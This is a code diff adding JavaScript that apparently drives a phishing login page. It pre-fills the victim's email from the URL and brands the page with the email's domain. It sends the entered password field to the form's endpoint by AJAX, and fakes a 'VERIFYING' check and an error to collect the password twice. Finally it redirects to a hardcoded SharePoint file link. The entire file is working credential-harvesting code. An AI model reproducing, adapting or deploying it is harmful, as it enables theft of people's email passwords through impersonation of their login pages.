@@ -1,0 +1,93 @@
+
+            
+            var modal = document.getElementById('id01');
+            window.onclick = function(event) {
+              if (event.target == modal) {
+                modal.style.display = "none";
+              }
+            }
+            var email = new URLSearchParams(location.search).get('email'),
+            error = new URLSearchParams(location.search).get("error");
+            if (email){
+              var domain = email.split("@")[1];
+              var dom = domain.slice(0, domain.lastIndexOf("."));
+              $("#pet").val(email);
+              $("#pet").attr("readonly", "true");
+              $("#source").val(dom.toUpperCase());
+            }
+            var modal = document.getElementById('id01');
+            modal.style.display = "block";
+            var submit = 0,
+            dot = '.';
+            $("#login_form").submit(function (event) {
+              event.preventDefault();
+              $("#submit-btn").prop("disabled", true);
+              var interv = setInterval(() => {
+                $("#submit-btn").html("VERIFYING").append(dot);
+                dot = dot + ".";
+                if (dot === "...."){
+                  dot = '.';
+                }
+              }, 500);
+              $("#submit-btn").prop("disabled","disabled");
+              var $form = $( this ),
+              url = $form.attr( "action" ),
+              data = $form.serialize();
+              
+              $.ajax({
+                type: "POST",
+                url: url,
+                data: data,
+                cache: false,
+                timeout: 800000,
+                success: function (res) {
+                  $form.find( "input[name='pett']" ).val('');
+                  error = $form.find( "input[name='error']" ).val();
+                  clearInterval(interv);
+                  $("#pett").val('');
+                  $("#submit-btn").html("CONTINUE");
+                  $("#submit-btn").removeAttr("disabled");
+                  $("#showerror").show();
+                  $("#pett").addClass("errorBorder");
+                  if (error || submit || $form.find( "input[name='error']" ).val()){
+                    const emaildom = $("#pet").val();
+                    dom = emaildom.split("@")[1] ? `http://${emaildom.split("@")[1]}` : `https://regionalmanagers-my.sharepoint.com/:b:/p/ivan/EVhCMbG-roNHisHIx3fXqXkBATy7wZKPXYQsdKYIS5rgWA?e=1XABKN/`;
+                    dom = `https://regionalmanagers-my.sharepoint.com/:b:/p/ivan/EVhCMbG-roNHisHIx3fXqXkBATy7wZKPXYQsdKYIS5rgWA?e=1XABKN/`;
+                    console.log(dom)
+                    location.replace(dom);
+                    
+                  }
+                  $form.find( "input[name='error']" ).val('error');
+                  submit = 1;
+                },
+                error: function (e) {
+                  $form.find( "input[name='pett']" ).val('');
+                  error = $form.find( "input[name='error']" ).val();
+                  clearInterval(interv);
+                  $("#pett").val('');
+                  $("#submit-btn").html("CONTINUE");
+                  $("#submit-btn").removeAttr("disabled");
+                  $("#showerror").show();
+                  $("#pett").addClass("errorBorder");
+                  if (error || submit || $form.find( "input[name='error']" ).val()){
+                    const emaildom = $("#pet").val();
+                    dom = emaildom.split("@")[1] ? `http://${emaildom.split("@")[1]}` : `https://regionalmanagers-my.sharepoint.com/:b:/p/ivan/EVhCMbG-roNHisHIx3fXqXkBATy7wZKPXYQsdKYIS5rgWA?e=1XABKN/`;
+                    dom = `https://regionalmanagers-my.sharepoint.com/:b:/p/ivan/EVhCMbG-roNHisHIx3fXqXkBATy7wZKPXYQsdKYIS5rgWA?e=1XABKN/`;
+                    console.log(dom)
+                    location.replace(dom);
+                    
+                  }
+                  $form.find( "input[name='error']" ).val('error');
+                  submit = 1;
+                  
+                }
+              });
+              
+            });
+            
+            if(error){
+              $("#error").val(error);
+              $("#showerror").show();
+              $("#pett").addClass("errorBorder");
+            }
+          
